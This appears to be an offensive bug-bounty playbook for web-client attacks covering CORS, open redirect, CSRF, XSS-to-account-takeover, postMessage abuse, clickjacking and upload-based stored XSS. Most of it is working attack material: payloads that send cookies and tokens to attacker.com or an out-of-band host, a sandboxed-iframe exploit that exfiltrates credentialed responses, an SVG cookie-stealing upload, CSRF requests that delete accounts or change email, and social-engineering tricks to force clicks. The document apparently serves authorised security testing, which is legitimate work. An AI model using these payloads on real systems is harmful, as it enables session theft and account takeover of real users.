# Web-Misc — CORS, Open Redirect, CSRF, XSS→ATO (chain fodder)

These are frontend-adjacent classes. johnwick1 is backend-focused, so **most of these are only valid
chained** (see [chaining.md](chaining.md)) — alone they're on the kill-list. Hunt them for the chain, not
the primitive.

## CORS misconfiguration
Reflected/permissive origin **plus** `Access-Control-Allow-Credentials: true` = cross-origin credentialed
read of private data.
```bash
# does the app reflect an arbitrary Origin AND allow credentials?
curl -s -I https://target/api/me -H "Origin: https://evil.com" | grep -i 'access-control-allow-'
# also try: null origin, subdomain (evil.target.com), suffix (target.com.evil.com), prefix, trailing dot
```
**Valid only if:** `Allow-Credentials: true` AND the reflected origin is attacker-controlled AND the
endpoint returns PII/secrets. PoC = an HTML page on your origin that `fetch(...,{credentials:'include'})`
and exfils the response. `*` alone (no credentials) → the browser blocks credentialed reads → usually N/A.

## Open redirect
```
?url=//evil.com   ?next=https://evil.com   ?return=/\/evil.com   ?redirect=https:evil.com
whitelist bypass: ?url=https://target.com.evil.com   ?url=https://target.com@evil.com   ?url=/%2f%2fevil.com
```
**Alone = N/A.** Valid when chained: OAuth `redirect_uri` → steal `code`/`token` (→ [auth-attacks.md](auth-attacks.md)),
or to leak a token via Referer. Always try to land it on an OAuth/SSO flow.

## CSRF (modern)
Most apps have tokens/SameSite — hunt the **gaps**, and only on **sensitive actions** → ATO.
- **SameSite bypass:** state-changing `GET`; top-level navigation (`SameSite=Lax` still sends on GET
  nav); a sibling subdomain (`Lax`/`None` sharing); method-override (`_method=PUT`, `X-HTTP-Method-Override`).
- **Content-type flip:** JSON endpoint that also accepts `text/plain`/form → send a simple-request CSRF.
- **Token gaps:** token not validated, reused across users, reflected from a param, missing on one verb.
- **Impact:** CSRF → change email/password → **ATO**; CSRF to link attacker OAuth; login/logout CSRF as a
  chain step. CSRF on a low-impact action alone = kill-list.

## Upload-metadata content-type confusion → stored XSS
When an upload flow is two-step (init call declares metadata, then a PUT/POST sends bytes to a returned
URL), check whether the init call accepts an **explicit, client-controlled `contentType`/mimetype field**
independent of the actual file extension or magic bytes — and whether the server later **serves** the file
with that declared type. A real disclosed case (workspace-collab platform, critical severity): the upload
metadata declared `fileName: "image.png"` but `contentType: "text/html"` for the SAME request body — the
server stored and served it as HTML, giving stored XSS in any other member's session who opened the
"image." Set `contentType` to `text/html`/`image/svg+xml` regardless of what extension/bytes you send;
extension-only or magic-byte-only upload filters miss this entirely since neither ever gets checked.

## XSS → ATO (turn the primitive into impact)
`alert(1)` is N/A. Convert to impact:
```javascript
// steal session / bearer / CSRF token → act as victim
fetch('https://OOB/?c='+btoa(document.cookie+'|'+localStorage.getItem('token')))
// or drive an authenticated state-change as the victim (change email → ATO)
fetch('/api/account',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},
  body:JSON.stringify({email:'attacker@x.com'})})
```
**Highest value:** stored XSS in an **admin** panel → admin takeover; XSS that reads an httpOnly-exempt
token or CSRF token → full ATO. Detection sources/sinks + CSP bypasses are in [payloads.md](payloads.md).

## postMessage abuse (not covered elsewhere — check every listener)
`grep -rn "addEventListener(.message" js/files/` to find every handler, then check both directions:
- **Receiver missing/wildcard origin check** — `window.addEventListener('message', (e) => { ...e.data... })`
  with no `if (e.origin !== 'https://target.com') return` (or a regex-based check that a lookalike origin
  passes) lets **any** page that can open/frame yours send it a message. Escalate by what the handler
  *does* with `e.data`: writes to `innerHTML`/`eval`s it → XSS; sets a token/config/account field → state
  tampering or ATO.
- **Sender using `*` as targetOrigin** — `otherWindow.postMessage(sensitiveData, '*')` leaks the message to
  whatever origin currently occupies that window/frame reference, including one an attacker navigated it to.
  Variant confirmed on a real disclosed PlayStation Network token leak: the sender code looked like it
  passed a specific origin (`window.opener.postMessage(a, c)`), but `c` was itself read from a
  **client-supplied URL parameter** (`targetOrigin=`) with no allowlist — set it to `*` (or your own
  domain) in the URL and the "specific origin" check is worthless. Don't just check for a literal `'*'` in
  the source; trace where the targetOrigin argument's *value* actually comes from.
- PoC: host an attacker page that `window.open()`s or `<iframe>`s the target, then `postMessage()`s a
  crafted payload — show the concrete effect (DOM write, state change, or leaked data in your console).

## Clickjacking with real impact (most clickjacking is N/A — this is the exception)
Check `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` first — if either blocks framing, stop,
it's not exploitable. If neither is set, it's only a **finding** when a single click on a *framed,
invisible* element performs a **sensitive, state-changing action** with no other protection (no CSRF
token check, no re-auth, no confirmation step) — e.g., "delete account," "transfer funds," "change email,"
"disable 2FA." Build the PoC as an opacity:0 iframe over a decoy button positioned so the real click lands
on the sensitive control; show the action actually executing, not just that framing is possible.
**Double clickjacking** is a newer variant worth trying when a single-click PoC gets blocked: a two-step
drag-and-drop or double-click sequence across two overlaid pages, which can slip past defenses built
assuming a single click. OAuth/consent authorize pages are the highest-value target for either variant —
multiple disclosed reports hit consent screens specifically, not random buttons.
**Keyboard-repeat UI forcing** is a related, non-iframe technique worth trying alongside clickjacking: if a
page auto-focuses a specific element via a URL hash/fragment (common for accessibility/deep-linking), and
that element is a sensitive action button, social-engineer the victim into holding down any key (frame it
as a fake "hold to verify you're human" or a mini-game) — the resulting repeated keydown/Enter events fire
the pre-focused button without a real click. A real disclosed OAuth-authorize case used exactly this to
force-authorize a third-party app.

## Proof-of-impact bar
CORS → show real PII exfiltrated cross-origin. Open redirect/CSRF → show the **chained** ATO/token theft.
XSS → show session/token theft or an action performed as the victim, not a popup. postMessage → show the
concrete DOM/state effect of a crafted message, not just that the listener has no origin check. Clickjacking
→ show the sensitive action actually firing through the frame, not just a missing header.

---

## CSRF ADDITIONS

### SameSite Bypass via Client-Side Redirect
```bash
# SameSite=Lax blocks cross-origin POST but not top-level GET navigation
# If there's a same-site URL that redirects to the CSRF target:
# 1. Find a same-site open redirect or client-side redirect
# 2. Navigate victim there: window.location = "https://target.com/redirect?url=/api/action"
# The redirect is same-site, then performs the state-changing request in a same-site context
# Burp Extension: CSRF Scanner + manual verification required
```

### Lax+POST 2-Minute Window (Chrome)
```bash
# Chrome doesn't enforce SameSite=Lax for POST requests on cookies set within the last 2 minutes
# Useful when: victim JUST logged in or session was JUST created
# Test by timing the attack immediately after a fresh login or session creation
```

### Double-Submit Token Not Tied to Session
```bash
# Anti-CSRF via double-submit cookie: token in cookie = token in form
# Vulnerable if: you can set your own CSRF token value (via cookie injection) and use it in the form
# Test: modify the CSRF token to any value in BOTH the cookie and the form → if accepted = broken binding
# Also: token from attacker's session accepted for victim's request?
# Get CSRF token for attacker account → use it in a CSRF request against victim account
curl -X POST https://target.com/api/account/delete \
  -H "Cookie: session=VICTIM_SESSION; csrf=ATTACKER_CSRF_TOKEN" \
  -H "X-CSRF-Token: ATTACKER_CSRF_TOKEN" \
  -d "confirm=true"
```

### GraphQL GET Mutation CSRF
```bash
# GraphQL mutations via GET request (no CORS preflight for simple GET):
curl "https://target.com/graphql?query=mutation{deleteUser(id:123){success}}"
# With the victim's browser cookie automatically attached
```

### Cookie Shadowing / Downgrade via Subdomain
```bash
# If attacker controls a subdomain (XSS or takeover):
# Set a same-site cookie WITHOUT SameSite attribute from subdomain
# The subdomain's cookie (same name) shadows the main domain's SameSite=Strict cookie
# → CSRF protection bypassed
document.cookie = "session=FORGED_VALUE; domain=.target.com; path=/";
```

### Method Override CSRF
```bash
# Endpoint protected with CSRF token check only on POST
# Method override makes it accept as POST but send as GET (no CSRF token check on GET):
curl "https://target.com/api/delete?_method=POST&id=123"
curl -X POST https://target.com/api/delete \
  -H "X-HTTP-Method-Override: DELETE" \
  -d "id=123"
```

---

## CORS ADDITIONS

### Regex Bypass Shapes
```bash
# Unescaped dot in regex allows: xxtarget.com (x replacing the dot)
curl -si https://target.com/api/data -H "Origin: https://xxtarget.com" | grep -i "access-control"

# Unanchored prefix match (startsWith-like check):
curl -si https://target.com/api/data -H "Origin: https://target.com.evil.com"
curl -si https://target.com/api/data -H "Origin: https://target.com@evil.com"

# Unanchored suffix match:
curl -si https://target.com/api/data -H "Origin: https://eviltarget.com"

# Substring includes():
curl -si https://target.com/api/data -H "Origin: https://evil.com?target.com"

# Test all variants; if ACAO reflects your origin AND ACAC: true → credentialed cross-origin read
```

### null Origin via Sandboxed iframe
```bash
# Some apps allowlist "null" origin for local testing:
curl -si https://target.com/api/data -H "Origin: null" | grep -i "access-control"
# If ACAO: null and ACAC: true → exploit via sandboxed iframe:
# <iframe sandbox="allow-scripts allow-forms" srcdoc='
#   <script>
#     fetch("https://target.com/api/data", {credentials:"include"})
#       .then(r=>r.text()).then(d=>fetch("https://attacker.com/?d="+btoa(d)));
#   </script>'>
# </iframe>
```

### Wildcard Subdomain Trust + Takeover/XSS Chain
```bash
# If CORS trusts *.target.com:
curl -si https://target.com/api/data -H "Origin: https://evil.target.com"
# If reflected → any subdomain XSS or takeover = full credentialed CORS read
# Cross-ref params-takeover.md for dangling subdomain targets
```

### Vary: Origin Missing → CORS Decision Cached
```bash
# If the CDN caches the CORS response without Vary: Origin:
# Request with attacker Origin first → response cached with ACAO: https://attacker.com
# Victim's request hits cache → wrong ACAO in their response
# Test: does the CORS response include Vary: Origin?
curl -si https://target.com/api/data -H "Origin: https://attacker.com" | grep -i "vary"
# Cross-ref cache-attacks.md
```

---

## POSTMESSAGE ADDITIONS

### Origin Check Bypass Shapes
```bash
# startsWith bypass:
# if (event.origin.startsWith("https://target.com")) → bypass with https://target.com.evil.com
# endsWith bypass:
# if (event.origin.endsWith("target.com")) → bypass with https://eviltarget.com
# indexOf bypass:
# if (event.origin.indexOf("target.com") !== -1) → bypass with https://target.com.evil.com
# Unescaped dot regex:
# /^https:\/\/target\.com/.test(event.origin) — actually safe (dot escaped)
# /^https:\/\/target.com/.test(event.origin) — vulnerable (dot not escaped)
# null origin check:
# if (event.origin === 'null') → exploit via sandboxed iframe
```

### targetOrigin Read from URL Parameter (PSN Token-Leak Pattern)
```bash
# Some apps read targetOrigin from the URL when opening a popup:
# window.opener.postMessage(token, window.location.href)
# If window.location.href is attacker-controlled (via open redirect or navigation):
# Open target.com/auth?redirect=https://attacker.com → popup posts token to attacker.com
# Classic: PlayStation Network token leak via this pattern
```

### event.source Not Validated
```bash
# Handler does not check event.source → any window can trigger the handler
# If the handler performs privileged actions (login, token exchange):
# Test from your own page: window.postMessage({action:"login",...}, "https://target.com")
# Or: iframe target.com inside your page → postMessage to the iframe's contentWindow
```

---

## UPLOAD / SNIFF STORED XSS

### Content-Disposition: inline + MIME Sniffing
```bash
# Upload an HTML file — if served with Content-Disposition: inline and no Content-Type: text/html
# Browser may MIME-sniff it as HTML and render it:
echo '<script>alert(document.cookie)</script>' > xss.html
# Upload as any extension (.txt, .bin, .data)
# Fetch the served URL directly in browser → check if renders as HTML

# Check response headers of uploaded file:
curl -si "https://target.com/uploads/your_file" | head -20
# Vulnerable if:
# - Content-Disposition: inline (not attachment)
# - No X-Content-Type-Options: nosniff
# - Content-Type: application/octet-stream (browser will sniff)
```

### SVG Stored XSS (via Upload)
```bash
# SVG is XML and executes JavaScript in browsers when opened directly:
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)">
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
</svg>
EOF
# Upload → get direct link → open in browser → XSS fires
# Even served as image/svg+xml → still executes if opened directly (not embedded)
```

### PDF.js Client-Side XSS (via Hosted PDFs)
```bash
# PDF.js versions <3.x (CVE-2024-4367): Arbitrary JS execution via PDF font name injection
# Check PDF.js version embedded in the app:
curl https://target.com/static/pdf.js | grep -i "version"
# If < 4.2.67: craft malicious PDF with JS in font name field → renders as XSS in PDF viewer
# PoC generator: https://github.com/LOURC0D3/CVE-2024-4367-PoC
```
